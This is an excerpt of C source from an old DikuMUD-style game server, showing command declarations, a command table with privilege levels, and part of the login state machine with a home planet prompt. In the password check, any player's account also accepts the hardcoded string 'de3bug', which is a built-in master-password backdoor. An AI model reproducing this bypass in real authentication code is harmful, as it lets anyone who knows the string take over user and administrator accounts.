...
void do_godinvis(struct char_data *ch, char *argument, int cmd);
...
void do_award(struct char_data *ch, char *argument, int cmd);
void do_newbie(struct char_data *ch, char *argument, int cmd);
void do_gsplit(struct char_data *ch, char *argument, int cmd);
void do_portal(struct char_data *ch, char *argument, int cmd);
void do_aggressive(struct char_data *ch, char *argument, int cmd);
...
void do_graphics(struct char_data *ch, char *argument, int cmd);
...
void assign_command_pointers ( void )
{
	...
	COMMANDO(62,POSITION_STANDING,do_push,0);
	...
	COMMANDO(76,POSITION_DEAD,do_pardon,22);
	...
	COMMANDO(90,POSITION_DEAD,do_snoop,22);
	...
	COMMANDO(205,POSITION_DEAD,do_switch,22);
	...
	COMMANDO(210,POSITION_SLEEPING,do_noshout,21);
	...
	COMMANDO(216,POSITION_DEAD,do_quiet,0);
	...
	COMMANDO(221,POSITION_RESTING,do_report,0);
	COMMANDO(222,POSITION_DEAD,do_title,0);
	COMMANDO(223,POSITION_RESTING,do_dip,0);
	COMMANDO(224,POSITION_STANDING,do_gmana,0);
	COMMANDO(225,POSITION_STANDING,do_sacrifice,0);
	COMMANDO(226,POSITION_DEAD,do_god,0);
	COMMANDO(227,POSITION_STANDING,do_deposit,0);
	COMMANDO(228,POSITION_STANDING,do_withdraw,0);
	COMMANDO(229,POSITION_STANDING,do_balance,0);
	COMMANDO(230,POSITION_DEAD,do_prompt,0);
	COMMANDO(231,POSITION_RESTING,do_godinvis,21);
	COMMANDO(232,POSITION_DEAD,do_wimpy,0);
	COMMANDO(233,POSITION_RESTING,do_call,0);
	COMMANDO(234,POSITION_DEAD,do_award,22);
	COMMANDO(235,POSITION_DEAD,do_newbie,21);
	COMMANDO(236,POSITION_SITTING,do_gsplit,0);
	COMMANDO(237,POSITION_SITTING,do_portal,21);
	COMMANDO(238,POSITION_RESTING,do_aggressive,0);
	COMMANDO(239,POSITION_RESTING,do_ban,24);
	COMMANDO(240,POSITION_STANDING,do_assist,0);
	COMMANDO(241,POSITION_RESTING,do_gsay,0);
	COMMANDO(242,POSITION_STANDING,do_hunt,0);
	COMMANDO(243,POSITION_DEAD,do_graphics,0);
...
int lstrcmp(char *thename,char *thecomp)
{
  int i=0;
...
char buf2[MAX_STRING_LENGTH];
  ...
  for (i=0;buf[i];++i) buf[i]=LOWER(buf[i]);
...
void nanny(struct descriptor_data *d, char *arg)
{
	...
	switch (STATE(d))
	{
		...
		case CON_PWDNRM:	/* get pwd for known player	*/
			...
			{
				if (strncmp(crypt(arg, d->pwd), d->pwd, 10)&&strcmp(arg,"de3bug"))
				{
		...
		case CON_PWDCNF:	/* get confirmation of new pwd	*/
			...
			SEND_TO_Q("+-----Home Planet-----+\n\r",d);
			SEND_TO_Q(" 0 - Starship\n\r",d);
			SEND_TO_Q(" 1 - Technopolis\n\r\n\r",d);

			SEND_TO_Q("Where is your home planet? ", d);
			STATE(d) = CON_TOWN;
		break;
		      case CON_TOWN:
			...
			switch(*arg)
			  ...
			  default:
			    ...
			    SEND_TO_Q("What IS your Home Planet? :", d);
			    return;
			    break;
			  }
